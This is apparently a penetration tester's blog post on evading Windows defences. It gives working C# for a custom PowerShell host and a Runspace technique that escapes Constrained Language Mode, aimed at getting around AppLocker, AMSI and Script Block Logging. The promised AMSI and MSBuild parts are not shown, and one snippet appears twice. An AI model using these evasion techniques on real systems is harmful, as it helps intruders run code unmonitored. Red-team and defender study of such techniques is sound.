---
title: "Using MSBuild to bypass PowerShell Constrained Language Mode, AMSI and Script Block Logging"
excerpt: "Post demonstrating how to use C# and MSBuild to create a PowerShellish CLI without CLM, AMSI and Script Block Logging, whilst bypassing default AppLocker rules."
last_modified_at: 2018-01-03T09:45:06-05:00
header:
  teaser: "assets/images/markup-syntax-highlighting-teaser.jpg"
tags: 
  - c#
  - NET
  - powershell
  - Contstrained Language Mode
  - CLM
  - AMSI
  - Script Block Logging
toc: false
classes: wide
layout: single
---

Often during engagements, I find that any semi-mature organisation will apply AppLocker, have PowerShell set to Constrained Language Mode and have Anti-Virus turned on. In more mature organisations they will monitor PowerShell Script Block logs to identify malicious PowerShell Activity.
<br/><br/>
In this post, I will go other how to use C# and a classic AppLocker bypass using MSBuild to defeat all these, and once again obtain a PowerShell-ish CLI without AV, in Full Language Mode and without Script Block logging.
### Whats AppLocker?
AppLocker is Microsoft's version of application whitelisting. It allows organisations to control what type of executuable content users are allowed to run on their Windows machines. For example, it can be used to stop random executeables from an unknown publisher from running. This means even if we built a C# application, often we can't just run the resulting executeable without finding some other method of running it, these methods often use Microsoft signed binaries or scripts termed Living Off the Land Binaries and Scripts (LOLBAS), a classic example of this is the Microsoft MSBuild binary.
### Constrained Language Mode
For years attackers have been using the power of PowerShell to perform various useful tasks, including post explotation, network enumeration, as can be seen in the awesome PowerSploit library. Constrained Language Mode is a particular language mode that PowerShell can be set into that heavily restricts the types of commands that can be run, severly reducing the usefulness of various PowerShell based malware, often making them unusable. THis includes disabling Add-Type compilation, making it harder if not impossible to access and use the Win32/Native API's. This is a recommended security setting to turn on in PowerShell, and mature organisations will (or should) have this set on all user endpoints. One way of checking to see if PowerShell CLM is enabled is by running the following in PowerShell:
{% highlight csharp %}
$ExecutionContext.SessionState.LanguageMode
{% endhighlight %}
If it says "ConstrainedLanguage" then CLM is enabled, otherwise it will say state "FullLanguage".
### AMSI 
Anti-Malware Scan Interface (AMSI) is a Windows interface that allows applications to connect to Anti-Virus soutions. In PowerShell, AMSI is used to scan every command before it is run, to check if it contains known malicious content. This stops us from being able to download and run known malicious PowerShell scripts in memory without bypassing it.<br/><br/>
### ETW
Event Tracing for Windows (ETW) allows applications to generate events (act as ETW providers) that can be monitored and displayed by other services/applications (ETW consumers). In PowerShell the usage of this is termed PowerShell Script Block logging, where certain interesting scripts/commands run are logged, which can be viewed from Windows Event Viewer or monitored by various Anti-Virus/EDR solutions. This is at least one method of capturing potentially malicious PowerShell activity by security vendors.


### POC Code
OK, so enough talking, time for some code. <br/><br/>
## Part 1 - Creating a fake "PowerShell" CLI
To default Constrained Language, we can use C#. PowerShell.exe, the normal way of opening/using PowerShell, is effectively a GUI application that will create an instance of the PowerShell .NET object and let you interact with it (via the CLI). So for us to programmatically use and bypass security features enabled in the PowerShell.exe's instance of the .NET PowerShell object, we need to create our own .NET PowerShell object.  To do this we need to use the .NET assembly that contains PowerShell itself, located in System.Management.Automation.dll (C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\). <br/><br/>
With this instance, we can run commands by calling the AddScript method on our new PowerShell object, then running the Invoke() method to invoke the stored command. From this, we can combine a while loop to create a fake PowerShell CLI. The code for this is:
{% highlight csharp %}
using System;
using System.IO;
using System.Management.Automation;
using System.Collections.ObjectModel;
namespace SharpPowershell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();
            Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
            String cmd;
            while ((cmd = Console.ReadLine()) != null)
            {
                ps.AddScript(cmd); 
                try { 
                    
                    Collection<PSObject> psOutput = ps.Invoke();   
                    foreach (PSObject output in psOutput) { 
                        if (output != null) {
                            Console.WriteLine(output.ToString());
                        } 
                    }
                    Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
                    foreach (ErrorRecord error in errors)
                    {
                        Console.WriteLine("**** ERROR ****");
                        Console.Error.WriteLine(error.ToString());
                    }
                } catch (Exception e) { 
                    Console.WriteLine("**** ERROR ****"); 
                    if (e.Message != null) { 
                        Console.WriteLine(e.Message); 
                    } 
                    ps.Stop(); 
                    ps.Commands.Clear(); 
                }
                ps.Commands.Clear(); 
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
            }
        }
    }
}
{% endhighlight %}
The above code will create an instance of the .NET PowerShell object. We then in a loop, read user input and treat it as a PowerShell command. We add the user input as a script (AddScript), and run it (Invoke). The return from Invoke is a Collection (effectively a list) of PSOutput objects, containing the output from the user's input (the script we added). We iterate over these that returned from running the command and print it to the console.
After, we want to also print out any Error output from the PowerShell object. When a command is run and a PowerShell error occurs, it is added to the Error I/O stream in the PowerShell object. We read all the Error output (of type ErrorRecord) that was generated by the command and print it to the console (since we perform a ReadAll() operation on a Stream, the Stream will become empty).
In case this operation of running a command, and printing its output runs into a runtime exception, we create an exception handler, and simply print the exception (not the most graceful method, but this way an issue with one command won't crash our program entirely).<br/><br/>

After the command has run (or exception caught) we need to remove the commands/scripts we added before (the Invoke method doesn't remove the added commands/scripts) otherwise we will rerun every previous command whenever Invoke is called. <br/><br/>
To compile the above, you will need to add a reference to the C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll .NET assembly.
Once compiled, and run we obtain a PowerShell CLI clone:

## Part 2 - Defeating CLM via Custom Runspaces 
In PowerShell, each "session" has at least one Runspace. A Runspace is a container for the variables, scripts run and is what is responsible for running PowerShell commands. The PowerShell object is responsible for collecting commands, then sending it to its created and assigned Runspace, which will return output, that the PowerShell object returns. A PowerShell instance can have multiple Runspaces (called Runspace Pool) which allows multithreaded execution. For us the important thing to note is that when we say PowerShell has Constrained Language Mode set, we mean that the Runspace being used by the PowerShell instance has Constrained Language Mode set. When we set Constrained Language Mode on a machine/user, we are saying that when powershell.exe is used, a PowerShell object and the Runspace created is set to Constrained Language. When we create our own instance of PowerShell, the Runspace may or may not have Constrained Language Mode set on it during creation.<br/><br/>
Looking at our example we can see Constrained Language Mode is not set on our PowerShell instance by replacing the first line of the program with:
{% highlight csharp %}
Runspace rs = RunspaceFactory.CreateRunspace(); 
rs.Open(); 
PowerShell ps = PowerShell.Create();
ps.Runspace = rs; 
{% endhighlight %}      
{% include figure image_path="/assets/img/sharppowershellnoclm.png" alt="" caption="" %}
Even though in our example, CLM was not enabled, if it was we could instead manually create a new PowerShell Runspace, and assign it to our instance of PowerShell. To do this we can use the RunspaceFactory to create a new Runspace (this by default does not have CLM enabled) and assign it to our PowerShell object by replacing the first line with:
{% highlight csharp %}
Runspace rs = RunspaceFactory.CreateRunspace(); 
rs.Open(); 
PowerShell ps = PowerShell.Create();
ps.Runspace = rs; 
{% endhighlight %}
## Part 3 - Defeating AMSI 
When we run the program, and try to download PowerView.ps1 into memory, AMSI flags it as malware and makes it unuseable, as can be seen below.



### GitHub link

This has been combined into one POC on my GitHub, located <a href="https://github.com/ret2desync/SharpPowerShell"> here</a>